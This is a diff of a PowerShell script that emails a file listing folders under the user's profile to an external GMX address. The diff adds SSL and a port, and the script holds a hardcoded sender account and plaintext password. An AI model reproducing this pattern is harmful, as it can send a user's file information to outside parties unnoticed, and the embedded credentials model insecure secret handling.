@@ -1,10 +1,11 @@
 $senderEmail = "jhonhkfj@gmx.com"
-$recipientEmail = "Kroksten@gmx.com"
+$recipientEmail = "kroksten@gmx.com"
 $subject = "Folder List"
 $body = "Please find attached the folder list."
 $attachmentPath = Join-Path -Path ([System.Environment]::ExpandEnvironmentVariables("%USERPROFILE%")) -ChildPath "folder_list.txt"
 $smtpServer = "mail.gmx.com"
-$username = "your_username"
+$port = 465
+$username = "jhonhkfj@gmx.com"
 $password = "john@201"
 
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -24,7 +25,7 @@ $success = $false
 while (-not $success -and $retryCount -lt $maxRetries) {
     try {
         # Email sending
-        $result = Send-MailMessage -From $senderEmail -To $recipientEmail -Subject $subject -Body $body -Attachments $attachmentPath -SmtpServer $smtpServer -Credential $credentials
+        $result = Send-MailMessage -From $senderEmail -To $recipientEmail -Subject $subject -Body $body -Attachments $attachmentPath -SmtpServer $smtpServer -Port $port -UseSsl -Credential $credentials
         $success = $true
         Write-Output "Email sent successfully."
     } catch {
